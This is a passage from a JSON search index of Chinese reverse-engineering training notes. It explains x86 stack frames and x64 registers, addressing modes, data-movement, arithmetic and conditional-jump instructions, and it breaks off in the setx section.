\u5b57\u8282\u7684\u53d8\u91cf\u817e\u51fa\u4f4d\u7f6e\npush %edi\npush %esi ;\u8fd9\u4e2a\u51fd\u6570\u4f1a\u4fee\u6539 EDI \u548c ESI, \u6240\u4ee5\u5148\u7ed9\u5b83\u4eec\u5165\u6808\n;\u4e0d\u9700\u8981\u4fdd\u5b58 EBX, EBP \u548c ESP\n\n;\u5b50\u7a0b\u5e8f\u4e3b\u4f53\nmov 8(%ebp), %eax ;\u628a\u53c2\u6570 1 \u7684\u503c\u79fb\u5230 EAX \u4e2d\nmov 12(%ebp), %esi ;\u628a\u53c2\u6570 2 \u7684\u503c\u79fb\u5230 ESI \u4e2d\nmov 16(%ebp), %edi ;\u628a\u53c2\u6570 3 \u7684\u503c\u79fb\u5230 EDI \u4e2d\n\nmov %edi, -4(%ebp) ;\u628a EDI \u79fb\u7ed9\u5c40\u90e8\u53d8\u91cf\nadd %esi, -4(%ebp) ;\u628a ESI \u6dfb\u52a0\u7ed9\u5c40\u90e8\u53d8\u91cf\nadd -4(%ebp), %eax ;\u5c06\u5c40\u90e8\u53d8\u91cf\u7684\u5185\u5bb9\u6dfb\u52a0\u5230 EAX ( \u6700\u7ec8\u7ed3\u679c ) \u4e2d\n\n;\u5b50\u7a0b\u5e8f\u7ed3\u5c3e\npop %esi ;\u6062\u590d\u5bc4\u5b58\u5668\u7684\u503c\npop %edi\nmov %ebp, %esp ;\u91ca\u653e\u5c40\u90e8\u53d8\u91cf\npop %ebp ;\u6062\u590d\u8c03\u7528\u8005\u7684\u57fa\u6307\u9488\u503c\nret\n</code></pre> <p>\u5b50\u7a0b\u5e8f\u5e8f\u8a00\u6267\u884c\u6807\u51c6\u64cd\u4f5c, \u5373\u5728 EBP ( \u57fa\u6307\u9488 ) \u4e2d\u4fdd\u5b58\u6808\u6307\u9488\u7684\u526f\u672c, \u901a\u8fc7\u9012\u51cf\u6808\u6307\u9488\u6765\u5206\u914d\u5c40\u90e8\u53d8\u91cf, \u5e76\u5728\u6808\u4e0a\u4fdd\u5b58\u5bc4\u5b58\u5668\u7684\u503c.</p> <p>\u5728\u5b50\u4f8b\u7a0b\u7684\u4e3b\u4f53\u4e2d, \u6211\u4eec\u53ef\u4ee5\u770b\u5230\u57fa\u6307\u9488\u7684\u4f7f\u7528. \u5728\u5b50\u7a0b\u5e8f\u6267\u884c\u671f\u95f4, \u53c2\u6570\u548c\u5c40\u90e8\u53d8\u91cf\u90fd\u4f4d\u4e8e\u4e0e\u57fa\u6307\u9488\u7684\u5e38\u91cf\u504f\u79fb\u5904. \u7279\u522b\u5730, \u6211\u4eec\u6ce8\u610f\u5230, \u7531\u4e8e\u53c2\u6570\u5728\u8c03\u7528\u5b50\u7a0b\u5e8f\u4e4b\u524d\u88ab\u653e\u5728\u6808\u4e2d, \u56e0\u6b64\u5b83\u4eec\u603b\u662f\u4f4d\u4e8e\u6808\u57fa\u6307\u9488 ( \u5373\u66f4\u9ad8\u7684\u5730\u5740 ) \u4e4b\u4e0b. \u5b50\u7a0b\u5e8f\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u603b\u662f\u53ef\u4ee5\u5728\u5185\u5b58\u5730\u5740 ( EBP+8 ) \u627e\u5230, \u7b2c\u4e8c\u4e2a\u53c2\u6570\u5728 ( EBP+12 ), \u7b2c\u4e09\u4e2a\u53c2\u6570\u5728 ( EBP+16). \u7c7b\u4f3c\u5730, \u7531\u4e8e\u5728\u8bbe\u7f6e\u57fa\u6307\u9488\u540e\u5206\u914d\u5c40\u90e8\u53d8\u91cf, \u56e0\u6b64\u5b83\u4eec\u603b\u662f\u4f4d\u4e8e\u6808\u4e0a\u57fa\u6307\u9488 ( \u5373\u8f83\u4f4e\u5730\u5740 ) \u4e4b\u4e0a. \u7279\u522b\u662f, \u7b2c\u4e00\u4e2a\u5c40\u90e8\u53d8\u91cf\u603b\u662f\u4f4d\u4e8e ( EBP-4 ), \u7b2c\u4e8c\u4e2a\u4f4d\u4e8e ( EBP-8 ), \u4ee5\u6b64\u7c7b\u63a8. \u8fd9\u79cd\u57fa\u6307\u9488\u7684\u5e38\u89c4\u4f7f\u7528, \u8ba9\u6211\u4eec\u53ef\u4ee5\u5feb\u901f\u8bc6\u522b\u51fd\u6570\u5185\u90e8\u5c40\u90e8\u53d8\u91cf\u548c\u53c2\u6570\u7684\u4f7f\u7528.</p> <p>\u51fd\u6570\u7ed3\u5c3e\u57fa\u672c\u4e0a\u662f\u51fd\u6570\u5e8f\u8a00\u7684\u955c\u50cf. \u4ece\u6808\u4e2d\u6062\u590d\u8c03\u7528\u8005\u7684\u5bc4\u5b58\u5668\u503c, \u901a\u8fc7\u91cd\u7f6e\u6808\u6307\u9488\u6765\u91ca\u653e\u5c40\u90e8\u53d8\u91cf, \u6062\u590d\u8c03\u7528\u8005\u7684\u57fa\u6307\u9488\u503c, \u5e76\u7528 <code>ret</code> \u6307\u4ee4\u8fd4\u56de\u8c03\u7528\u8005\u4e2d\u7684\u76f8\u5e94\u4ee3\u7801\u4f4d\u7f6e, \u4ece\u54ea\u6765\u56de\u54ea\u53bb.</p> <p>\u7ef4\u57fa\u767e\u79d1 X86 \u8c03\u7528\u7ea6\u5b9a</p>"},{"location":"Training/Material/Reverse/#34-x64","title":"3.4 x64 \u6c47\u7f16\u57fa\u7840","text":""},{"location":"Training/Material/Reverse/#341","title":"3.4.1 \u5bfc\u8bed","text":"<p>x86-64 (\u4e5f\u88ab\u79f0\u4e3a x64 \u6216\u8005 AMD64) \u662f 64 \u4f4d\u7248\u672c\u7684 x86/IA32 \u6307\u4ee4\u96c6. \u4ee5\u4e0b\u662f\u6211\u4eec\u5173\u4e8e CS107 \u76f8\u5173\u529f\u80fd\u7684\u6982\u8ff0.</p>"},{"location":"Training/Material/Reverse/#342-registers","title":"3.4.2 \u5bc4\u5b58\u5668 Registers","text":"<p>\u4e0b\u56fe\u5217\u51fa\u4e86\u5e38\u7528\u7684\u5bc4\u5b58\u5668 ( 16\u4e2a\u901a\u7528\u5bc4\u5b58\u5668\u52a0\u4e0a 2 \u4e2a\u7279\u6b8a\u7528\u9014\u5bc4\u5b58\u5668 ). \u6bcf\u4e2a\u5bc4\u5b58\u5668\u90fd\u662f 64 bit \u5bbd, \u5b83\u4eec\u7684\u4f4e 32, 16, 8 \u4f4d\u90fd\u53ef\u4ee5\u770b\u6210\u76f8\u5e94\u7684 32, 16, 8 \u4f4d\u5bc4\u5b58\u5668, \u5e76\u4e14\u90fd\u6709\u5176\u7279\u6b8a\u540d\u79f0. \u4e00\u4e9b\u5bc4\u5b58\u5668\u88ab\u8bbe\u8ba1\u7528\u6765\u5b8c\u6210\u67d0\u4e9b\u7279\u6b8a\u76ee\u7684, \u6bd4\u5982 %rsp \u88ab\u7528\u6765\u4f5c\u4e3a\u6808\u6307\u9488, %rax \u4f5c\u4e3a\u4e00\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u503c. \u5176\u4ed6\u5bc4\u5b58\u5668\u5219\u90fd\u662f\u901a\u7528\u7684, \u4f46\u662f\u4e00\u822c\u5728\u4f7f\u7528\u7684\u65f6\u5019, \u8fd8\u662f\u8981\u53d6\u51b3\u4e8e\u8c03\u7528\u8005 ( Caller-owned )\u6216\u8005\u88ab\u8c03\u7528\u8005 ( Callee-owned ). \u5982\u679c\u51fd\u6570 binky \u8c03\u7528\u4e86 winky, \u6211\u4eec\u79f0 binky \u4e3a\u8c03\u7528\u8005, winky \u4e3a\u88ab\u8c03\u7528\u8005. \u4f8b\u5982, \u7528\u4e8e\u524d 6 \u4e2a\u53c2\u6570\u548c\u8fd4\u56de\u503c\u7684\u5bc4\u5b58\u5668\u90fd\u662f\u88ab\u8c03\u7528\u8005\u6240\u6709\u7684 ( Callee-owned ). \u88ab\u8c03\u7528\u8005\u53ef\u4ee5\u4efb\u610f\u4f7f\u7528\u8fd9\u4e9b\u5bc4\u5b58\u5668, \u4e0d\u7528\u4efb\u4f55\u9884\u9632\u63aa\u65bd\u5c31\u53ef\u4ee5\u968f\u610f\u8986\u76d6\u91cc\u9762\u7684\u5185\u5bb9. \u5982\u679c <code>%rax</code> \u5b58\u7740\u8c03\u7528\u8005\u60f3\u8981\u4fdd\u7559\u7684\u503c, \u5219 Caller \u5fc5\u987b\u5728\u8c03\u7528\u4e4b\u524d\u5c06\u8fd9\u4e2a <code>%rax</code> \u7684\u503c\u590d\u5236\u5230\u4e00\u4e2a \" \u5b89\u5168 \" \u7684\u4f4d\u7f6e. \u88ab\u8c03\u7528\u8005\u62e5\u6709\u7684 ( Callee-owned ) \u5bc4\u5b58\u5668\u975e\u5e38\u9002\u5408\u4e00\u4e9b\u4e34\u65f6\u6027\u7684\u4f7f\u7528. \u76f8\u53cd, \u5982\u679c\u88ab\u8c03\u7528\u8005\u6253\u7b97\u4f7f\u7528\u8c03\u7528\u8005\u6240\u62e5\u6709\u7684\u5bc4\u5b58\u5668, \u90a3\u4e48\u88ab\u8c03\u7528\u8005\u5fc5\u987b\u9996\u5148\u628a\u8fd9\u4e2a\u5bc4\u5b58\u5668\u7684\u503c\u5b58\u8d77\u6765, \u7136\u540e\u5728\u9000\u51fa\u8c03\u7528\u4e4b\u524d\u628a\u5b83\u6062\u590d. \u8c03\u7528\u8005\u62e5\u6709\u7684 ( Caller-owned ) \u5bc4\u5b58\u5668\u7528\u4e8e\u4fdd\u5b58\u8c03\u7528\u8005\u7684\u672c\u5730\u72b6\u6001 ( local state ), \u6240\u4ee5\u8fd9\u4e2a\u5bc4\u5b58\u5668\u9700\u8981\u5728\u8fdb\u4e00\u6b65\u7684\u51fd\u6570\u8c03\u7528\u4e2d\u88ab\u4fdd\u7559\u4e0b\u6765.</p> <p></p>"},{"location":"Training/Material/Reverse/#343-addressing-modes","title":"3.4.3 \u5bfb\u5740\u6a21\u5f0f Addressing modes","text":"<p>\u6b63\u7531\u4e8e\u5b83\u7684 CISC \u7279\u6027, X86-64 \u652f\u6301\u5404\u79cd\u5bfb\u5740\u6a21\u5f0f. \u5bfb\u5740\u6a21\u5f0f\u662f\u8ba1\u7b97\u8981\u8bfb\u6216\u5199\u7684\u5185\u5b58\u5730\u5740\u7684\u8868\u8fbe\u5f0f. \u8fd9\u4e9b\u8868\u8fbe\u5f0f\u7528\u4f5c<code>mov</code>\u6307\u4ee4\u548c\u8bbf\u95ee\u5185\u5b58\u7684\u5176\u5b83\u6307\u4ee4\u7684\u6765\u6e90\u548c\u53bb\u8def. \u4e0b\u9762\u7684\u4ee3\u7801\u6f14\u793a\u4e86\u5982\u4f55\u5728\u6bcf\u4e2a\u53ef\u7528\u7684\u5bfb\u5740\u6a21\u5f0f\u4e2d\u5c06 \u7acb\u5373\u6570 1 \u5199\u5165\u5404\u79cd\u5185\u5b58\u4f4d\u7f6e :</p> <pre><code>movl $1, 0x604892         ;\u76f4\u63a5\u5199\u5165, \u5185\u5b58\u5730\u5740\u662f\u4e00\u4e2a\u5e38\u6570\nmovl $1, (%rax)           ;\u95f4\u63a5\u5199\u5165, \u5185\u5b58\u5730\u5740\u5b58\u5728\u5bc4\u5b58\u5668 %rax \u4e2d\n\nmovl $1, -24(%rbp)       ;\u4f7f\u7528\u504f\u79fb\u91cf\u7684\u95f4\u63a5\u5199\u5165\n                         ;\u516c\u5f0f : (address = base %rbp + displacement -24)\n\nmovl $1, 8(%rsp, %rdi, 4) ;\u95f4\u63a5\u5199\u5165, \u7528\u5230\u4e86\u504f\u79fb\u91cf\u548c\u6309\u6bd4\u4f8b\u653e\u5927\u7684\u7d22\u5f15 ( scaled-index )\n           ;\u516c\u5f0f : (address = base %rsp + displ 8 + index %rdi * scale 4)\n\nmovl $1, (%rax, %rcx, 8) ;\u7279\u6b8a\u60c5\u51b5, \u7528\u5230\u4e86\u6309\u6bd4\u4f8b\u653e\u5927\u7684\u7d22\u5f15 ( scaled-index ), \u5047\u8bbe\u504f\u79fb\u91cf ( displacement ) \u4e3a 0\n\nmovl $1, 0x8(, %rdx, 4)  ;\u7279\u6b8a\u60c5\u51b5, \u7528\u5230\u4e86\u6309\u6bd4\u4f8b\u653e\u5927\u7684\u7d22\u5f15 ( scaled-index ), \u5047\u8bbe\u57fa\u6570 ( base ) \u4e3a 0\nmovl $1, 0x4(%rax, %rcx) ;\u7279\u6b8a\u60c5\u51b5, \u7528\u5230\u4e86\u6309\u6bd4\u4f8b\u653e\u5927\u7684\u7d22\u5f15 ( scaled-index ), \u5047\u8bbe\u6bd4\u4f8b ( scale ) \u4e3a0\n</code></pre>"},{"location":"Training/Material/Reverse/#344-common-instructions","title":"3.4.4 \u901a\u7528\u6307\u4ee4 Common instructions","text":"<p>\u5148\u8bf4\u4e0b\u6307\u4ee4\u540e\u7f00, \u4e4b\u524d\u8bb2\u8fc7\u8fd9\u91cc\u5c31\u91cd\u6e29\u4e00\u904d : \u8bb8\u591a\u6307\u4ee4\u90fd\u6709\u4e2a\u540e\u7f00 ( b, w, l, q ) , \u540e\u7f00\u6307\u660e\u4e86\u8fd9\u4e2a\u6307\u4ee4\u4ee3\u7801\u6240\u64cd\u7eb5\u53c2\u6570\u6570\u636e\u7684\u4f4d\u5bbd ( \u5206\u522b\u4e3a 1, 2, 4 \u6216 8 \u4e2a\u5b57\u8282 ). \u5f53\u7136, \u5982\u679c\u53ef\u4ee5\u4ece\u53c2\u6570\u786e\u5b9a\u4f4d\u5bbd\u7684\u65f6\u5019, \u540e\u7f00\u53ef\u4ee5\u88ab\u7701\u7565. \u4f8b\u5982\u5462, \u5982\u679c\u76ee\u6807\u5bc4\u5b58\u5668\u662f %eax, \u5219\u5b83\u5fc5\u987b\u662f 4 \u5b57\u8282\u5bbd, \u5982\u679c\u662f %ax \u5bc4\u5b58\u5668, \u5219\u5fc5\u987b\u662f 2 \u4e2a\u5b57\u8282, \u800c %al \u5c06\u662f 1 \u4e2a\u5b57\u8282. \u8fd8\u6709\u4e9b\u6307\u4ee4, \u6bd4\u5982 <code>movs</code> \u548c <code>movz</code> \u6709\u4e24\u4e2a\u540e\u7f00 : \u7b2c\u4e00\u4e2a\u662f\u6765\u6e90\u53c2\u6570, \u7b2c\u4e8c\u4e2a\u662f\u53bb\u8def. \u8fd9\u8bdd\u4e4d\u4e00\u770b\u8ba9\u4eba\u6478\u4e0d\u7740\u5934\u8111, \u4e14\u542c\u6211\u5206\u6790. \u4f8b\u5982, <code>movzbl</code> \u8fd9\u4e2a\u6307\u4ee4\u628a 1 \u4e2a\u5b57\u8282\u7684\u6765\u6e90\u53c2\u6570\u503c\u79fb\u52a8\u5230 4 \u4e2a\u5b57\u8282\u7684\u53bb\u8def.</p> <p>\u5f53\u76ee\u6807\u662f\u5b50\u5bc4\u5b58\u5668 ( sub-registers ) \u65f6, \u53ea\u6709\u5b50\u5bc4\u5b58\u5668\u7684\u7279\u5b9a\u5b57\u8282\u88ab\u5199\u5165, \u4f46\u6709\u4e00\u4e2a\u4f8b\u5916 : 32 \u4f4d\u6307\u4ee4\u5c06\u76ee\u6807\u5bc4\u5b58\u5668\u7684\u9ad8 32 \u4f4d\u8bbe\u7f6e\u4e3a 0.</p>"},{"location":"Training/Material/Reverse/#mov-lea","title":"<code>mov</code> \u548c <code>lea</code> \u6307\u4ee4","text":"<p>\u5230\u76ee\u524d\u4e3a\u6b62, \u6211\u4eec\u9047\u5230\u7684\u6700\u9891\u7e41\u7684\u6307\u4ee4\u5c31\u662f <code>mov</code>, \u800c\u5b83\u6709\u5f88\u591a\u53d8\u79cd. \u5173\u4e8e <code>mov</code> \u6307\u4ee4\u5c31\u4e0d\u591a\u8bf4\u4e86, \u548c\u4e4b\u524d 32 \u4f4d x86 \u7684\u6ca1\u4ec0\u4e48\u533a\u522b. <code>lea</code> \u6307\u4ee4\u5176\u5b9e\u4e5f\u6ca1\u4ec0\u4e48\u597d\u8bf4\u7684, \u4e0a\u4e00\u8282\u90fd\u6709, \u8fd9\u91cc\u5c31\u4e0d\u5e9f\u8bdd\u4e86.</p> <pre><code>\u8fd9\u91cc\u5199\u51e0\u4e2a\u6bd4\u8f83\u6709\u610f\u601d\u7684\u4f8b\u5b50 :\nmov 8(%rsp), %eax    ;%eax = \u4ece\u5730\u5740 %rsp + 8 \u8bfb\u53d6\u7684\u503c\nlea 0x20(%rsp), %rdi ;%rdi = %rsp + 0x20\nlea (%rdi,%rdx,1), %rax  ;%rax = %rdi + %rdx\n</code></pre> <p>\u5728\u628a\u8f83\u5c0f\u4f4d\u5bbd\u7684\u6570\u636e\u79fb\u52a8\u590d\u5236\u5230\u8f83\u5927\u4f4d\u5bbd\u7684\u60c5\u51b5\u4e0b, <code>movs</code> \u548c <code>movz</code> \u8fd9\u4e24\u4e2a\u53d8\u79cd\u6307\u4ee4\u7528\u4e8e\u6307\u5b9a\u600e\u4e48\u6837\u53bb\u586b\u5145\u5b57\u8282, \u56e0\u4e3a\u4f60\u662f\u4e00\u4e2a\u5c0f\u4e1c\u897f\u88ab\u79fb\u5230\u4e86\u4e00\u4e2a\u5927\u7a7a\u95f4, \u80af\u5b9a\u8fd8\u6709\u5730\u65b9\u662f\u7a7a\u7684, \u6240\u4ee5\u7a7a\u7684\u5730\u65b9\u8981\u586b\u8d77\u6765, \u62ff 0 \u6216\u8005 \u7b26\u53f7\u6269\u5c55 ( sign-extend ) \u6765\u586b\u5145.</p> <pre><code>movsbl %al, %edx     ;\u628a 1 \u4e2a\u5b57\u8282\u7684 %al, \u7b26\u53f7\u6269\u5c55 \u590d\u5236\u5230 4 \u5b57\u8282\u7684 %edx\nmovzbl %al, %edx     ;\u628a 1 \u4e2a\u5b57\u8282\u7684 %al, \u96f6\u6269\u5c55 ( zero-extend ) \u590d\u5236\u5230 4 \u5b57\u8282\u7684 %edx\n</code></pre> <p>\u6709\u4e2a\u7279\u6b8a\u60c5\u51b5\u8981\u6ce8\u610f, \u9ed8\u8ba4\u60c5\u51b5\u4e0b, \u5c06 32 \u4f4d\u503c\u5199\u5165\u5bc4\u5b58\u5668\u7684 <code>mov</code> \u6307\u4ee4, \u4e5f\u4f1a\u5c06\u5bc4\u5b58\u5668\u7684\u9ad8 32 \u4f4d\u5f52\u96f6, \u5373\u9690\u5f0f\u96f6\u6269\u5c55\u5230\u4f4d\u5bbd q. \u8fd9\u4e2a\u89e3\u91ca\u4e86\u8bf8\u5982 <code>mov %ebx, %ebx</code> \u8fd9\u79cd\u6307\u4ee4, \u8fd9\u4e9b\u6307\u4ee4\u770b\u8d77\u6765\u5f88\u5947\u602a, \u4f46\u5b9e\u9645\u4e0a\u8fd9\u662f\u7528\u4e8e\u4ece 32 \u4f4d\u6269\u5c55\u5230 64 \u4f4d. \u56e0\u4e3a\u8fd9\u4e2a\u662f\u9ed8\u8ba4\u7684, \u6240\u4ee5\u6211\u4eec\u4e0d\u7528\u663e\u5f0f\u7684 <code>movzlq</code> \u6307\u4ee4. \u5f53\u7136, \u6709\u4e00\u4e2a <code>movslq</code> \u6307\u4ee4\u4e5f\u662f\u4ece 32 \u4f4d\u7b26\u53f7\u6269\u5c55\u5230 64 \u4f4d.</p> <p><code>cltq</code> \u6307\u4ee4\u662f\u4e00\u4e2a\u5728 %rax \u4e0a\u8fd0\u884c\u7684\u4e13\u7528\u79fb\u52a8\u6307\u4ee4. \u8fd9\u4e2a\u6ca1\u6709\u53c2\u6570\u7684\u6307\u4ee4\u5728 %rax \u4e0a\u8fdb\u884c\u7b26\u53f7\u6269\u5c55, \u6e90\u4f4d\u5bbd\u4e3a L, \u76ee\u6807\u4f4d\u5bbd\u4e3a q.</p> <pre><code>cltq   ;\u5728 \uff05rax \u4e0a\u8fd0\u884c\uff0c\u5c06 4 \u5b57\u8282 src \u7b26\u53f7\u6269\u5c55\u4e3a 8 \u5b57\u8282 dst\uff0c\u7528\u4e8e movslq \uff05eax\uff0c\uff05rax\n</code></pre>"},{"location":"Training/Material/Reverse/#_12","title":"\u7b97\u672f\u548c\u4f4d\u8fd0\u7b97","text":"<p>\u4e8c\u8fdb\u5236\u7684\u8fd0\u7b97\u4e00\u822c\u662f\u4e24\u4e2a\u53c2\u6570, \u5176\u4e2d\u7b2c\u4e8c\u4e2a\u53c2\u6570\u65e2\u662f\u6211\u4eec\u6307\u4ee4\u8fd0\u7b97\u7684\u6765\u6e90, \u4e5f\u662f\u53bb\u8def\u7684\u6765\u6e90, \u5c31\u662f\u8bf4\u6211\u4eec\u628a\u8fd0\u7b97\u7ed3\u679c\u5b58\u5728\u7b2c\u4e8c\u4e2a\u53c2\u6570\u91cc. \u6211\u4eec\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u53ef\u4ee5\u662f\u7acb\u5373\u6570\u5e38\u6570, \u5bc4\u5b58\u5668\u6216\u8005\u5185\u5b58\u5355\u5143. \u7b2c\u4e8c\u4e2a\u53c2\u6570\u5fc5\u987b\u662f\u5bc4\u5b58\u5668\u6216\u8005\u5185\u5b58. \u8fd9\u4e24\u4e2a\u53c2\u6570\u4e2d, \u6700\u591a\u53ea\u6709\u4e00\u4e2a\u53c2\u6570\u662f\u5185\u5b58\u5355\u5143, \u5f53\u7136\u4e5f\u6709\u7684\u6307\u4ee4\u53ea\u6709\u4e00\u4e2a\u53c2\u6570, \u8fd9\u4e2a\u53c2\u6570\u65e2\u662f\u6211\u4eec\u8fd0\u7b97\u6570\u636e\u7684\u6765\u6e90, \u4e5f\u662f\u6211\u4eec\u8fd0\u7b97\u6570\u636e\u7684\u53bb\u8def, \u5b83\u53ef\u4ee5\u662f\u5bc4\u5b58\u5668\u6216\u8005\u5185\u5b58. \u8fd9\u4e2a\u6211\u4eec\u4e0a\u4e00\u8282\u8bb2\u4e86, \u8fd9\u91cc\u56de\u987e\u4e00\u4e0b. \u8bb8\u591a\u7b97\u672f\u6307\u4ee4\u7528\u4e8e\u6709\u7b26\u53f7\u548c\u65e0\u7b26\u53f7\u7c7b\u578b,\u4e5f\u5c31\u662f\u5e26\u7b26\u53f7\u52a0\u6cd5\u548c\u65e0\u7b26\u53f7\u52a0\u6cd5\u90fd\u4f7f\u7528\u76f8\u540c\u7684\u6307\u4ee4. \u5f53\u9700\u8981\u7684\u65f6\u5019, \u53c2\u6570\u8bbe\u7f6e\u7684\u6761\u4ef6\u4ee3\u7801\u53ef\u4ee5\u7528\u6765\u68c0\u6d4b\u4e0d\u540c\u7c7b\u578b\u7684\u6ea2\u51fa.</p> <pre><code>add src, dst ;dst = dst + src\nsub src, dst ;dst = dst - src\nimul src, dst ;dst = dst * src\nneg dst ;dst = -dst ( \u7b97\u672f\u53d6\u53cd )\n\nand src, dst ;dst = dst &amp; src\nor src, dst ;dst = dst | src\nxor src, dst ;dst = dst ^ src\nnot dst ;dst = ~dst ( \u6309\u4f4d\u53d6\u53cd )\n\nshl count, dst ;dst &lt;&lt;= count ( \u6309 count \u7684\u503c\u6765\u5de6\u79fb ), \u8ddf\u8fd9\u4e2a\u76f8\u540c\u7684\u662f`sal`\u6307\u4ee4\nsar count, dst ;dst = count ( \u6309 count \u7684\u503c\u6765\u7b97\u672f\u53f3\u79fb )\nshr count, dst ;dst = count ( \u6309 count \u7684\u503c\u6765\u903b\u8f91\u53f3\u79fb )\n\n;\u67d0\u4e9b\u6307\u4ee4\u6709\u7279\u6b8a\u60c5\u51b5\u53d8\u4f53, \u8fd9\u4e9b\u53d8\u4f53\u6709\u4e0d\u540c\u7684\u53c2\u6570\nimul src ;\u4e00\u4e2a\u53c2\u6570\u7684 imul \u6307\u4ee4\u5047\u5b9a %rax \u4e2d\u5176\u4ed6\u53c2\u6570\u8ba1\u7b97 128 \u4f4d\u7684\u7ed3\u679c, \u5728 %rdx \u4e2d\u5b58\u50a8\u9ad8 64 \u4f4d, \u5728 %rax \u4e2d\u5b58\u50a8\u4f4e 64 \u4f4d.\nshl dst ;dst &lt;&lt;= 1 ( \u540e\u9762\u6ca1\u6709 count \u53c2\u6570\u7684\u65f6\u5019\u9ed8\u8ba4\u662f\u79fb\u52a8 1 \u4f4d, `sar`, `shr`, `sal` \u6307\u4ee4\u4e5f\u662f\u4e00\u6837 )\n</code></pre> <p>\u8fd9\u4e9b\u6307\u4ee4\u4e0a\u4e00\u8282\u90fd\u8bb2\u8fc7, \u8fd9\u91cc\u7a0d\u5fae\u63d0\u4e00\u4e0b.</p>"},{"location":"Training/Material/Reverse/#_13","title":"\u6d41\u7a0b\u63a7\u5236\u6307\u4ee4","text":"<p>\u6709\u4e00\u4e2a\u7279\u6b8a\u7684 %eflags \u5bc4\u5b58\u5668, \u5b83\u5b58\u7740\u4e00\u7ec4\u88ab\u79f0\u4e3a\u6761\u4ef6\u4ee3\u7801\u7684\u5e03\u5c14\u6807\u5fd7. \u5927\u591a\u6570\u7684\u7b97\u672f\u8fd0\u7b97\u4f1a\u66f4\u65b0\u8fd9\u4e9b\u6761\u4ef6\u4ee3\u7801. \u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4\u8bfb\u53d6\u8fd9\u4e9b\u6761\u4ef6\u4ee3\u7801\u4e4b\u540e, \u518d\u786e\u5b9a\u662f\u5426\u6267\u884c\u76f8\u5e94\u7684\u5206\u652f\u6307\u4ee4. \u6761\u4ef6\u4ee3\u7801\u5305\u62ec ZF( \u96f6\u6807\u5fd7 ), SF( \u7b26\u53f7\u6807\u5fd7 ), OF( \u6ea2\u51fa\u6807\u5fd7, \u6709\u7b26\u53f7 ) \u548c CF( \u8fdb\u4f4d\u6807\u5fd7, \u65e0\u7b26\u53f7 ). \u4f8b\u5982, \u5982\u679c\u7ed3\u679c\u4e3a 0 , \u5219\u8bbe\u7f6e ZF, \u5982\u679c\u64cd\u4f5c\u6ea2\u51fa ( \u8fdb\u5165\u7b26\u53f7\u4f4d ), \u5219\u8bbe\u7f6e OF.</p> <p>\u8fd9\u4e9b\u6307\u4ee4\u4e00\u822c\u662f\u5148\u6267\u884c <code>cmp</code> \u6216 <code>test</code> \u64cd\u4f5c\u6765\u8bbe\u7f6e\u6807\u5fd7, \u7136\u540e\u518d\u8ddf\u8df3\u8f6c\u6307\u4ee4\u53d8\u91cf, \u8be5\u53d8\u91cf\u8bfb\u53d6\u6807\u5fd7\u6765\u786e\u5b9a\u662f\u91c7\u7528\u5206\u652f\u4ee3\u7801\u8fd8\u662f\u7ee7\u7eed\u4e0b\u4e00\u6761\u4ee3\u7801. <code>cmp</code> \u6216 <code>test</code> \u7684\u53c2\u6570\u662f\u7acb\u5373\u6570, \u5bc4\u5b58\u5668\u6216\u8005\u5185\u5b58\u5355\u5143 ( \u6700\u591a\u53ea\u6709\u4e00\u4e2a\u5185\u5b58\u53c2\u6570 ). \u6761\u4ef6\u8df3\u8f6c\u6709 32 \u4e2d\u53d8\u4f53, \u5176\u4e2d\u51e0\u79cd\u6548\u679c\u662f\u4e00\u6837\u7684. \u4e0b\u9762\u662f\u4e00\u4e9b\u5206\u652f\u6307\u4ee4.</p> <pre><code>cmpl op2, op1 ;\u8fd0\u7b97\u7ed3\u679c = op1 - op2, \u4e22\u5f03\u7ed3\u679c\u7136\u540e\u8bbe\u7f6e\u6761\u4ef6\u4ee3\u7801\ntest op2, op1 ;\u8fd0\u7b97\u7ed3\u679c = op1 &amp; op2, \u4e22\u5f03\u7ed3\u679c\u7136\u540e\u8bbe\u7f6e\u6761\u4ef6\u4ee3\u7801\n\njmp target ;\u65e0\u6761\u4ef6\u8df3\u8dc3\nje target ;\u7b49\u4e8e\u65f6\u8df3\u8dc3, \u548c\u5b83\u76f8\u540c\u7684\u8fd8\u6709 jz, \u5373jump zero ( ZF = 1 )\njne target ;\u4e0d\u76f8\u7b49\u65f6\u8df3\u8dc3, \u548c\u5b83\u76f8\u540c\u7684\u8fd8\u6709 jnz, \u5373 jump non zero ( ZF = 0 )\njl target ;\u5c0f\u4e8e\u65f6\u8df3\u8dc3, \u548c\u5b83\u76f8\u540c\u7684\u8fd8\u6709 jnge, \u5373 jump not greater or equal ( SF != OF )  \njle target ;\u5c0f\u4e8e\u7b49\u4e8e\u65f6\u8df3\u8dc3, \u548c\u5b83\u76f8\u540c\u7684\u8fd8\u6709 jng, \u5373 jump not greater ( ZF = 1 or SF != OF )\njg target ;\u5927\u4e8e\u65f6\u8df3\u8dc3, \u548c\u5b83\u76f8\u540c\u7684\u8fd8\u6709 jnle, \u5373 jump not less or equal ( ZF = 0 and SF = OF )\njge target ;\u5927\u4e8e\u7b49\u4e8e\u65f6\u8df3\u8dc3, \u548c\u5b83\u76f8\u540c\u7684\u8fd8\u6709 jnl, \u5373 jump not less ( SF = OF )\nja  target ;\u8df3\u5230\u4e0a\u9762, \u548c\u5b83\u76f8\u540c\u7684\u8fd8\u6709 jnbe, \u5373 jump not below or equal ( CF = 0 and ZF = 0 )\njb  target ;\u8df3\u5230\u4e0b\u9762, \u548c\u5b83\u76f8\u540c\u7684\u8fd8\u6709 jnae, \u5373 jump not above or equal ( CF = 1 )\njs  target ;SF = 1 \u65f6\u8df3\u8dc3\njns target ;SF = 0 \u65f6\u8df3\u8dc3\n</code></pre> <p>\u5176\u5b9e\u4f60\u4e5f\u4f1a\u53d1\u73b0\u8fd9\u91cc\u5927\u90e8\u5206\u4e0a\u4e00\u8282\u90fd\u8bb2\u8fc7, \u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u518d\u6765\u4e00\u904d\u5de9\u56fa\u4e00\u4e0b.</p>"},{"location":"Training/Material/Reverse/#setxmovx","title":"<code>setx</code>\u548c<code>movx</code>","text":"<p>\u8fd8\u6709\u4e24\u4e2a\u6307\u4ee4\u5bb6\u65cf\u53ef\u4ee5 \u8bfb\u53d6/\u54cd\u5e94 \u5f53\u524d\u7684\u6761\u4ef6\u4ee3\u7801. <code>setx</code> \u6307\u4ee4\u6839\u636e\u6761\u4ef6 x 